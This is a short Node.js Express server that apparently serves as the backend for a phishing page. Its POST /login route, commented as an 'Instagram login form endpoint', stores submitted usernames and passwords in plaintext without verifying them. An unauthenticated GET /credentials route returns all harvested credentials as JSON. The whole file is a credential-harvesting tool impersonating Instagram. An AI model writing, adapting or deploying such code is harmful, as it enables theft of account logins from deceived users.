const express = require('express');
const bodyParser = require('body-parser');
const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Store credentials
let userCredentials = [];

// Instagram login form endpoint
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username && password) {
        userCredentials.push({ username, password });
        res.send(`Received login credentials for ${username}`);
    } else {
        res.status(400).send('Username and password are required.');
    }
});

// Display stored credentials
app.get('/credentials', (req, res) => {
    res.json(userCredentials);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
